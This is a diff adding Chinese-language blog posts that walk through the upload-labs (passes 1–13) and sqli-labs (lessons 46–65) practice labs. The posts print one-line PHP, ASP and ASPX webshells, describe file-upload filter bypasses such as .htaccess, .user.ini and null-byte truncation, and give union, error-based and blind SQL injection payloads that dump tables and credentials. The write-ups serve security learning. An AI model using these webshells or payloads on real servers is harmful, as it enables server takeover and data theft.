@@ -64,6 +64,456 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-upload-labs-pass1-13" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/09/upload-labs-pass1-13/" class="article-date">
+  <time datetime="2021-02-09T11:32:20.000Z" itemprop="datePublished">2021-02-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/09/upload-labs-pass1-13/">upload-labs-pass1—13</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[TOC]</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>upload-labs主要是一些针对文件上传漏洞的实验。</p>
+<p>再正式开始之前，先了解一下<strong>什么是文件上传漏洞？</strong></p>
+<p><strong>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。显然这种漏洞是getshell最快最直接的方法之一，需要说明的是上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件。web应用程序通常带有文件上传的功能，比如在博客发表文章需要上传图片等行为就可能存在文件上传漏洞。文件上传漏洞就是利用网页代码中的文件上传路径变量过滤不严将，将可执行的文件上传到一个到服务器中，再通过URL去访问以执行恶意代码——攻击者可以直接上传WebShell（以asp、php或者jsp等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门）到服务器上。然后利用渗透工具（如蚁剑）连接webshell以达到操作服务器的目的。</strong></p>
+<ul>
+<li><strong>上传漏洞类型大体可分为以下几类：</strong></li>
+</ul>
+<p><img src="/.com//1.png" alt="1"></p>
+<ul>
+<li><p>判断上传漏洞类型的思路：<img src="/.com//2.png" alt="2" style="zoom: 200%;"></p>
+</li>
+<li><p><strong>webshell（一句话木马）的制备</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模板： <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;password&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>@</code>表示后面即使执行错误，也不报错。<code>eval（）</code>函数表示括号内的语句字符串什么的全都当做代码执行。<code>$_POST[&#39;password&#39;]</code>表示从页面中用post的方式获得password这个参数值。</p>
+</li>
+</ul>
+<p>那么这句话的作用是什么呢？举个例子：password=echo ‘a’，就相当于&lt; ?php @eval(“echo ‘a’”);? &gt;即再网页上输出一个a。我们知道了这个就可以根据改变password的值来达到操控服务器的目的了，或者我们可以连接蚁剑，一键获取目标服务器。</p>
+<p><strong>补充：</strong></p>
+<ul>
+<li><strong>入侵的条件</strong></li>
+</ul>
+<p>（1）木马上传成功，未被杀；<br>（2）知道木马的路径在哪；<br>（3）上传的木马能正常运行。</p>
+<ul>
+<li><p><strong>常见的一句话木马</strong></p>
+<p>php的一句话木马： &lt; ?php @eval($_POST[‘pass’]);? &gt;<br>asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p>
+</li>
+</ul>
+<h1 id="pass-01：js检查"><a href="#pass-01：js检查" class="headerlink" title="pass-01：js检查"></a>pass-01：js检查</h1><p>打开pass-01的index.php查看源码，我们看到网页对上传的图片做了js检查，</p>
+<p><img src="/.com//3.png" alt="3"></p>
+<p>而且设置了上传白名单，<img src="/.com//4.png" alt="4"></p>
+<p>因此题目要求我们上传一个webshell到服务器上，我们可以有以下三种思路：</p>
+<ol>
+<li>删除那段有关js检查的代码</li>
+<li>增加白名单中可上传文件类型</li>
+<li>先将上传文件类型改为白名单的一种（使其通过js检查）然后用burp抓包，再将其文件后缀更改为预期文件类型</li>
+</ol>
+<h1 id="pass-02：MIME绕过"><a href="#pass-02：MIME绕过" class="headerlink" title="pass-02：MIME绕过"></a>pass-02：MIME绕过</h1><ul>
+<li>查看提示：本pass在服务端对数据包的<strong>MIME</strong>进行检查。</li>
+</ul>
+<p><strong>MIME：</strong>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。在HTTP中，MIME类型被定义在Content-Type header中。</p>
+<p><strong>常见的MIME类型：</strong></p>
+<p>udio/mpeg -&gt; .mp3<br>application/msword -&gt; .doc<br>application/octet-stream -&gt; .exe<br>application/pdf -&gt; .pdf<br>application/x-javascript -&gt; .js<br>application/x-rar -&gt; .rar<br>application/zip -&gt; .zip<br>image/gif -&gt; .gif<br>image/jpeg -&gt; .jpg / .jpeg<br>image/png -&gt; .png<br>text/plain -&gt; .txt<br>text/html -&gt; .html<br>video/mp4 -&gt; .mp4</p>
+<ul>
+<li><strong>查看源码：</strong><img src="/.com//5.png" alt="5"></li>
+</ul>
+<p>也就是说服务器还是规定了白名单，那么我们可以有以下两种思路：</p>
+<p>1.先将webshell后缀类型改为允许上传的文件后缀类型（使其绕过MIME检查），然后burp抓包，将webshell后缀改回.php。</p>
+<p>2.将webshell.php文件上传，burp抓包，将Content-Type的MIME类型改为白名单中的类型。</p>
+<ul>
+<li><strong>sp：</strong>我在看源码的时候发现这关的源码也存在js检查的源码，但是我发现把这段码删了并不能实现上传webshell，因为源码中没有规定checkfile()的作用，而且服务器是通过if语句判断上传文件类型是否符合。</li>
+</ul>
+<h1 id="pass-03：上传特殊可解析后缀"><a href="#pass-03：上传特殊可解析后缀" class="headerlink" title="pass-03：上传特殊可解析后缀"></a>pass-03：上传特殊可解析后缀</h1><ul>
+<li>查看源码：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到服务器对上传文件做了很多过滤处理，包括设定了黑名单。</p>
+<ul>
+<li>这边我们补充一个知识点：Apache解析顺序是从右到左开始解析文件后缀，如果最右侧扩展名不能识别的话，就继续往左判断，直到遇到可以解析的文件后缀为止。而且Apache的httpd.conf中可以进行配置（AddType application/x-httpd-php .php .php3 .phtml），规定哪些文件后缀是以php格式来解析的。</li>
+</ul>
+<p>​      我们看到黑名单中没有禁用这些可解析后缀，因此我们可以利用这一点，上传可解析后缀。</p>
+<ul>
+<li><p>sp：常用可解析后缀<img src="/.com//6.png" alt="6"></p>
+</li>
+<li><p>陌生函数：</p>
+</li>
+</ul>
+<p>！strrchr() 函数</p>
+<p>功能：查找字符，在指定字符串中从后面开始的第一次出现的位置，如果成功，则返回从该位置到字符串结尾的所有字符，如果失败，则返回 false。</p>
+<p>语法：strrchr(string，char)</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string</td>
+<td>必需。规定被搜索的字符串。</td>
+</tr>
+<tr>
+<td>char</td>
+<td>必需。规定要查找的字符。如果该参数是数字，则搜索匹配数字 ASCII 值的字符。</td>
+</tr>
+</tbody></table>
+<p>！trim()函数</p>
+<p>功能：除去<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E4%B8%B2/1017763">字符串</a>开头和末尾的空格或其他字符。</p>
+<p>语法：trim (string $str [,string $charlist ])</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>string</em></td>
+<td>必需。规定要检查的字符串。</td>
+</tr>
+<tr>
+<td><em>charlist</em></td>
+<td>可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：”\0” - NULL ；”\t” - 制表符； “\n” - 换行； “\x0B” - 垂直制表符； “\r” - 回车 ；” “ - 空格</td>
+</tr>
+</tbody></table>
+<p>！in_array()函数</p>
+<p>功能：搜索数组中是否存在指定的值。</p>
+<p>语法：in_array(search,array,type)</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>search</em></td>
+<td>必需。规定要在数组搜索的值。</td>
+</tr>
+<tr>
+<td><em>array</em></td>
+<td>必需。规定要搜索的数组。</td>
+</tr>
+<tr>
+<td><em>type</em></td>
+<td>可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。如果 <em>search</em> 参数是字符串且 <em>type</em> 参数被设置为 TRUE，则搜索区分大小写。</td>
+</tr>
+</tbody></table>
+<p>！move_uploaded_file() 函数</p>
+<p>功能：将上传的文件移动到新位置。</p>
+<p>语法：move_uploaded_file(file,newloc)</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file</td>
+<td>必需。规定要移动的文件。</td>
+</tr>
+<tr>
+<td>newloc</td>
+<td>必需。规定文件的新位置。</td>
+</tr>
+</tbody></table>
+<ul>
+<li>注：这关我没能实现在本地复现，上传shell后用蚁剑连接不上，好像是Apache的版本不能太高。</li>
+</ul>
+<p>！str_ireplace() 函数</p>
+<p>功能：替换字符串中的一些字符（不区分大小写）。</p>
+<p>语法：str_ireplace(find,replace,string,count)</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>find</em></td>
+<td>必需。规定要查找的值。</td>
+</tr>
+<tr>
+<td><em>replace</em></td>
+<td>必需。规定替换 <em>find</em> 中的值的值。</td>
+</tr>
+<tr>
+<td><em>string</em></td>
+<td>必需。规定被搜索的字符串。</td>
+</tr>
+<tr>
+<td><em>count</em></td>
+<td>可选。一个变量，对替换数进行计数。</td>
+</tr>
+</tbody></table>
+<h1 id="pass-04：上传-htaccess"><a href="#pass-04：上传-htaccess" class="headerlink" title="pass-04：上传.htaccess"></a>pass-04：上传.htaccess</h1><ul>
+<li>这关的黑名单添加了可解析后缀，但是忽略了.htaccess类型。</li>
+</ul>
+<p>htaccess文件是Apache服务器中的一个配置文件，负责相关目录下网页配置，可以帮我们实现网页301重定向，自定义404错误页面，改变文件扩展名等功能。其中.htaccess文件内容:SetHandler application/x-httpd-php设置当前目录所有文件都使用PHP解析，无论上传任何类型文件，只要文件内容符合php语言代码规范，就会被当做php文件执行。</p>
+<ul>
+<li>因此这关的思路是：先上传一个后缀为.htaccess，内容为：SetHandler application/x-httpd-php</li>
+</ul>
+<p>​           &lt;FilesMatch “webshell.jpg”&gt;                   </p>
+<p>或　　                 SetHandler application/x-httpd-php         的文件，然后再上传webshell.jpg即可。</p>
+<p>​            </p>
+<ul>
+<li>注：这关我没能实现在本地复现，上传shell后用蚁剑连接不上，好像是Apache的版本不能太高。</li>
+</ul>
+<h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><ul>
+<li>pass-04是利用Apache的解析文件进行绕过黑名单，这关则是利用PHP的解析方式绕过黑名单。</li>
+</ul>
+<p>我们看到黑名单里又多加了一个htaccess类型，但是php配置文件类型php.ini没有被禁用，且提示告诉我们上传目录存在php文件（readme.php）。 </p>
+<ul>
+<li>那么这关的思路：先上传一个后缀为.user.ini（相当于用户自定义的php.ini）内容为 auto_prepend_file=webshell.png（意思是该目录下的所有php文件都包含webshell.png），然后我们再上传webshell.png，最后用蚁剑连接时我们要注意连接的是readme.php（因为其文件内容包含shell）而不是webshell.png。</li>
+</ul>
+<p>但是这里我其实有个疑问：那就是我们在现实渗透的时候又怎么会知道靶机的上传目录是否存在.php类型文件，以及.php文件的文件名呢？挖个坑！！！！！！！！！！！！！！！！！！！！！！！！！！！</p>
+<h1 id="pass-06：后缀大小写绕过"><a href="#pass-06：后缀大小写绕过" class="headerlink" title="pass-06：后缀大小写绕过"></a>pass-06：后缀大小写绕过</h1><ul>
+<li><p>这关我们查看源码发现，它的黑名单已经相当齐全了，但是它相对前几关删了一个函数：strtolower()。其作用就是把所有字符全部转为小写字母。</p>
+</li>
+<li><p>那么这关利用这一漏洞，上传webshell.phP文件，然后蚁剑连接即可。</p>
+</li>
+</ul>
+<h1 id="pass-07：空格绕过"><a href="#pass-07：空格绕过" class="headerlink" title="pass-07：空格绕过"></a>pass-07：空格绕过</h1><ul>
+<li><p>查看源码发现它删去了trim()函数。</p>
+</li>
+<li><p>这边补一个知识：在win系统下呢，如果文件后缀最后面是空格、点、：：$DATA会自动省去，也就是说在客户端目录下的是文件名是”干净”。那么我们这关的思路是：上传webshell.php文件然后抓包，在后缀后加一个空格。</p>
+</li>
+<li><p>那么这关的思路就是：先上传webshell.php，抓包，在后缀后加个空格</p>
+<p>sp：没能复现</p>
+</li>
+</ul>
+<h1 id="pass-08：点绕过"><a href="#pass-08：点绕过" class="headerlink" title="pass-08：点绕过"></a>pass-08：点绕过</h1><ul>
+<li>查看源码发现它删去了deldot()函数。原理同pass-07</li>
+</ul>
+<p>那么这关的思路就是：上传webshell.php然后抓包，在后缀后加个点（.）</p>
+<h1 id="pass-09：-DATA绕过"><a href="#pass-09：-DATA绕过" class="headerlink" title="pass-09：::$DATA绕过"></a>pass-09：::$DATA绕过</h1><ul>
+<li>查看源码发现少了对::$DATA的过滤。</li>
+</ul>
+<p>DATA(NTFS文件系统的存储数据流的一个属性)NTFS文件系统包括对备用数据流的支持,备用数据流允许文件包含多个数据流，每个文件至少有一个数据流。在Windows中，这个默认数据流称为：$DATA,当我们访问1.php::$DATA 时，就是请求 1.php 本身的数据，如果a.php 还包含了其他的数据流，比如a.php:lake2.php，请求1.php:lake2.php::$DATA，则是请求1.php中的流数据lake2.php的流数据内容。</p>
+<ul>
+<li>那么我们这关的思路是：先webshell.php，抓包，后缀后添加::DATA，最后蚁剑连接。</li>
+</ul>
+<h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><ul>
+<li>这关查看源码发现过滤的都过滤了，但是和以往有一点不同：上传位置表达方式改变</li>
+</ul>
+<p>旧：$img_path = UPLOAD_PATH.’/‘.date(“YmdHis”).rand(1000,9999).$file_ext;</p>
+<p>新：$img_path = UPLOAD_PATH.’/‘.$file_name;</p>
+<p>sp：没能复现</p>
+<h1 id="pass-11：双后缀名绕过"><a href="#pass-11：双后缀名绕过" class="headerlink" title="pass-11：双后缀名绕过"></a>pass-11：双后缀名绕过</h1><p>我们查看源码，发现关键句：$file_name = str_ireplace($deny_ext,””, $file_name);意思是查找上传的文件名中是否存在黑名单中的值，如果存在就删去。</p>
+<p>那么这关我们的思路是：上传webshell.php，抓包，后缀更改为pphphp</p>
+<h1 id="pass-12：-00截断（get型）"><a href="#pass-12：-00截断（get型）" class="headerlink" title="pass-12：%00截断（get型）"></a>pass-12：%00截断（get型）</h1><p>查看这关的源码，发现上传位置表达方式改变了——$img_path = $_GET[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;</p>
+<p>我们可以发现save_pasth是可控路径，有点像sql注入里?id=。</p>
+<p>先补充知识：</p>
+<p>1.php语法中，当一个字符串中存在空字符时，会导致空字符后面的字符被丢弃（误把它当成结束符），后面的数据直接忽略，这就导致漏洞产生。</p>
+<p>2.%00是对ascii码中的0对应的字符编码后的结果，0x00则是%00解码成的16进制。当url中的参数是通过GET方式获取时，%00会被自动解码。当通过POST方式获取时，不会自动解码，%00只会原样被当成字符串来输出。所以通过POST方式请求时，我们需要手动将它改写为十六进制0x00。</p>
+<p><img src="/.com//7.png" alt="7"></p>
+<p>那么这关我们的思路就是：上传webshell.png，抓包，令save_pasth=../upload/webshell.php%00</p>
+<p>sp：strrpos()函数</p>
+<p>功能：strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。返回字符（字符串）在目标字符串中最后一次出现的位置，如果没有找到字符串则返回 FALSE。字符串位置从 0 开始，不是从 1 开始。</p>
+<p>语法：strrpos(string,find,start)</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>string</em></td>
+<td>必需。规定被搜索的字符串。</td>
+</tr>
+<tr>
+<td><em>find</em></td>
+<td>必需。规定要查找的字符。</td>
+</tr>
+<tr>
+<td><em>start</em></td>
+<td>可选。规定在何处开始搜索。</td>
+</tr>
+</tbody></table>
+<h1 id="pass-13：0x00截断（post型）"><a href="#pass-13：0x00截断（post型）" class="headerlink" title="pass-13：0x00截断（post型）"></a>pass-13：0x00截断（post型）</h1><p>法一：同pass-12</p>
+<p>法二：上传webshell.png，抓包</p>
+<p><img src="/.com//8.png" alt="8"></p>
+<p>加上webshell.php，然后点开Hex，将webshell.php后面的20改为00，如果找不到20，那么就在raw的webshell.php后面加个空格<img src="/.com//9.png" alt="9"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/09/upload-labs-pass1-13/" data-id="ckld8142j00040cvucb7fe0iq" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-lesson54-65" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/08/lesson54-65/" class="article-date">
+  <time datetime="2021-02-08T15:57:12.000Z" itemprop="datePublished">2021-02-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/08/lesson54-65/">lesson54-65</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="lesson54："><a href="#lesson54：" class="headerlink" title="lesson54："></a>lesson54：</h1><p>我们通过查看蓝字可以大致明白这关的意思：输入payload的次数小等于十次的情况下获得数据库秘钥，如果超过十次那么表名，列名还有秘钥就会重新刷新。</p>
+<ul>
+<li>试探注入类型：?id=1’，页面错误，但是没有回显错误信息</li>
+</ul>
+<p>?id=1’ and ‘1’=’1，登入成功，回显用户名和密码</p>
+<p>?id=1’ and ‘1’=’2，页面错误</p>
+<ul>
+<li><p>因此我们可知存在sql注入点，且为单引号型。</p>
+</li>
+<li><p>因为我们知道了库名，我们就无需再爆库了。</p>
+</li>
+</ul>
+<p>爆表：?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’challenges’ –+</p>
+<p>爆列：?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’xfih974sor ‘–+</p>
+<p>爆值：?id=-1’ union select 1,2,group_concat(secret_2W57) from challenges.xfih974sor–+</p>
+<p>然后我们把得到的值输入，submit即可。</p>
+<ul>
+<li>最后查看源码，发现PHP对输入的key做了过滤处理，也就是说我们想从key一栏进行注入还是比较困难的。</li>
+</ul>
+<h1 id="lesson55："><a href="#lesson55：" class="headerlink" title="lesson55："></a>lesson55：</h1><p>同lesson54，不过注入类型改为了<code>)</code>。</p>
+<h1 id="lesson56："><a href="#lesson56：" class="headerlink" title="lesson56："></a>lesson56：</h1><p>同lesson54，不过注入类型改为了<code>&#39;)</code>。</p>
+<h1 id="lesson57"><a href="#lesson57" class="headerlink" title="lesson57:"></a>lesson57:</h1><p>同lesson54，不过注入类型改为了<code>&quot;</code>。</p>
+<h1 id="lesson58"><a href="#lesson58" class="headerlink" title="lesson58:"></a>lesson58:</h1><p>执行 sql 语句后，并没有返回数据库当中的数据，所以我们这里不能使用 union 联合注入， 这里使用报错注入或者延时注入。</p>
+<p><img src="/.com//1.png" alt="1"></p>
+<h1 id="lesson59："><a href="#lesson59：" class="headerlink" title="lesson59："></a>lesson59：</h1><p>同lesson58，注入类型变为数字型。</p>
+<h1 id="lesson60："><a href="#lesson60：" class="headerlink" title="lesson60："></a>lesson60：</h1><p>同lesson58，注入类型变为<code>&quot;)</code>。</p>
+<h1 id="lesson61："><a href="#lesson61：" class="headerlink" title="lesson61："></a>lesson61：</h1><p>同lesson58，注入类型变为<code>&#39;))</code></p>
+<h1 id="lesson62"><a href="#lesson62" class="headerlink" title="lesson62:"></a>lesson62:</h1><p>sql语法错误时不会回显报错，那么报错注入也没法用了，只能延时注入。</p>
+<h2 id="lesson63、64、65："><a href="#lesson63、64、65：" class="headerlink" title="lesson63、64、65："></a>lesson63、64、65：</h2><p>同lesson62，仅改变注入类型。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/08/lesson54-65/" data-id="ckld8142b00000cvuec6n9hgn" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-lesson46-53" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/07/lesson46-53/" class="article-date">
+  <time datetime="2021-02-07T10:56:07.000Z" itemprop="datePublished">2021-02-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/07/lesson46-53/">lesson46-53</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="background——Order-by后的注入："><a href="#background——Order-by后的注入：" class="headerlink" title="background——Order by后的注入："></a>background——Order by后的注入：</h1><p> 查看mysql官方select的文档：</p>
+<p><img src="/.com//1.jpg" alt="1"></p>
+<p>由于order by 后面只能接(字段名，表达式，位置)等信息，我们并不能向原来一样使用联合查询。</p>
+<p>查看lesson46的源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;sort&#x27;];	</span><br><span class="line">if(isset($id))</span><br><span class="line">	&#123;</span><br><span class="line">	//logging the connection parameters to a file for analysis.</span><br><span class="line">	$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">	fwrite($fp,&#x27;SORT:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">	fclose($fp);</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> $<span class="keyword">id</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们看到这关我们的输入应该是?sort=，而不再是?id=。我们输入?sort=1，即对第一列进行升序排序，且参数值要小等于列数，否则会报错（如有一个表有三列，?sort=4，页面就会报错）。</p>
+<h2 id="lesson46："><a href="#lesson46：" class="headerlink" title="lesson46："></a>lesson46：</h2><p>我们查看源码可知这是数字型注入，那么我们<strong>怎么判断是否存在order by后的注入呢？</strong>我们可以通过对比输入<code>?sort=1 desc</code>和<code>?sort=1 asc</code>（desc降序，asc升序）的返回页面来判断是否存在order by后的注入——若两者返回值不同，则说明存在order by后的注入。</p>
+<p>这关的payload句式有三种：</p>
+<ol>
+<li>?sort=(select ······)</li>
+<li>?sort=1 and (select ······)</li>
+<li>?sort=rand(······)</li>
+</ol>
+<p>注：句式(1)和(2)没有本质上的区别。</p>
+<h3 id="解法一-报错注入："><a href="#解法一-报错注入：" class="headerlink" title="解法一.报错注入："></a>解法一.报错注入：</h3><h4 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h4><p>?sort=1 and updatexml(1,concat(‘~’, database()),1)</p>
+<h4 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h4><p>?sort=1 and updatexml(1,concat(‘~’,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)),1)</p>
+<h4 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h4><p>?sort=1 and updatexml(1,concat(‘~’,(select group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’security’)),1)</p>
+<h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p>?sort=1 and updatexml(1,concat(‘~’,(select * from (select concat_ws(‘ ‘,id,username,password) from users limit 0,1) x)),1)</p>
+<p>注：这边不知道为什么<code>&#39;#&#39;</code>不能用了，找了半天原因。</p>
+<h2 id="解法二-布尔盲注："><a href="#解法二-布尔盲注：" class="headerlink" title="解法二.布尔盲注："></a>解法二.布尔盲注：</h2><p>SQL 像 PHP，也是一种弱类型，它会认为<code>true=1</code>，<code>false=0</code>。用在<code>order by</code>后会直接导致显示不同：</p>
+<p>A:<img src="/.com//image-20210209171458273.png" alt="image-20210209171458273"></p>
+<p>B:<img src="/.com//2.png" alt="2"></p>
+<p>C:<img src="/.com//3.png" alt="3"></p>
+<p>通过对比A,C我们可以发现，<code>order by</code>后接返回数字或布尔值（因为是弱类型，布尔值返回仍是数字）的语句是<strong>没有作用</strong>的！也就是说我们无法使用句式一、二进行布尔盲注，那么我们能不能使用句式三进行布尔盲注呢？</p>
+<p>我们先输入：?sort=rand(true)<img src="/.com//4.png" alt="4"></p>
+<p>再输入：?sort=rand(false)<img src="/.com//5.png" alt="5"></p>
+<p>我们可以看到两种得到的返回不同，那么就说明我们可以利用句式三来进行布尔盲注。</p>
+<p><strong>Q:其实这边有一个疑问，不是说order by后接的数字不起作用吗，为什么rand函数的返回值也是数字，但是却可以起作用呢？我突然有个猜想——order by后接字符、字符串或布尔值是不起作用的，也就是说数据库返回值不会根据字符串的不同而不同，如果是这样就可以理解为什么了,可是在我用时间盲注解这关的时候if函数返回值是1但是页面返回却和?sort=1的不同。我蒙了，算了，挖个坑吧！！！！！！！！！！！！！！！！！</strong></p>
+<p>我们的布尔盲注思路是这样的：?sort=rand（sql语句），如果sql语句正确，那么页面的返回会和?sort=rand(true)一样（利用了rand函数的伪随机性），反之和?sort=rand(false)一样。</p>
+<p><strong>sp：rand()函数是个随机函数，返回0~1间的小数。使用时也可以给定参数值（随机种子），相同的参数生成的结果也相同（伪随机性）。</strong></p>
+<h3 id="爆库：-1"><a href="#爆库：-1" class="headerlink" title="爆库："></a>爆库：</h3><p>?sort=rand(left(database(),8)=’security’)<img src="/.com//6.png" alt="6"></p>
+<p>我们看到页面返回与?sort=rand(true)的一样，说明数据库名就是security。</p>
